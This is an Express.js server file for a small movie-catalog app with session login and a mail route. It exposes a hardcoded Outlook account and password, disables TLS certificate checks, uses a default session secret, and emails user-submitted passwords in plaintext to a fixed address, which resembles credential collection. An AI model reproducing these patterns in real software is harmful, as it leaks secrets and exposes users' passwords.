const express=require('express')
const mongoose=require('mongoose')
const path=require('path')
const session=require('express-session')
const bodyParser=require('body-parser')
const nodemailer=require('nodemailer')
const peliculas = require('./schema/schema')

const app= express();

app.use(express.json())
app.use(bodyParser.urlencoded({extended:false}))


app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true,
 
}))




   
  

app.use(express.static(path.join(__dirname,'public')))
app.set('views',path.join(__dirname,'views'))
app.set('view engine','hbs')

const port=process.env.PORT||4000
mongoose.connect('mongodb://localhost:27017/peliculas',{useNewUrlParser:true},(err)=>{
    if(err)console.log(err)

    console.log('db conected')
    app.listen(port,(err)=>{
        if(err)console.log(err)

        console.log('http://localhost:',port)
    })
})
app.get('/index',(req,res)=>{
    res.render('index')
})

app.get('/home',(req,res)=>{
    if(req.session.nombre){
        res.render('home' , { nombre:req.session.nombre})
    }else{
        res.redirect('/index')
    }
   
})
app.post('/enviarPost',(req,res)=>{
    req.session.nombre = req.body.nombre
    
    res.redirect('/pelis')
    
})
app.use('/salir',(req,res)=>{
    req.session.nombre=null;
    res.redirect('/index')
})
app.post('/mailer',(req,res)=>{
    let transporter = nodemailer.createTransport({
        service: 'outlook',
        auth: {
            user: 'hernag_09@hotmail.com',
            pass: 'Raptor09'
        },

        tls: {
            rejectUnauthorized: false
        }

    })

    let mailoptions = {
        from: 'hernan',
        to: 'hernag_09@hotmail.com',
        subject: 'heroku',
        text: 'name' + req.body.useri + 'password' + req.body.pass +'Email'+req.body.mail+ 'message' + req.body.area,
        html: '<ul><li>' + req.body.useri + '</li><li>' + req.body.mail + '</li><li>'+req.body.pass+'</li></ul>' + '<p>' + req.body.area + '</p>'

    }

    transporter.sendMail(mailoptions, (error, info) => {
        if (error) console.log(`${error}`)
        else {
            console.log(info)
            res.redirect('/index')
        }
    })
})
app.get('/pelis',(req,res)=>{
    if(req.session.nombre){
        var pageOptions = {
            page: parseInt(req.query.page || 0),
            limit: parseInt(req.query.limit || 3)
        }


        peliculas.find({}, {}, { limit: 4, page: 0 }, (err, peliculas) => {
            if (err) res.status(500).send(`${err}`)
            if (!peliculas) res.status(404).send({
                mensaje: 'peliculas not found'
            })
            res.render('home', { peliculas })
        })
    }else{
        res.redirect('/index')
    }
   
})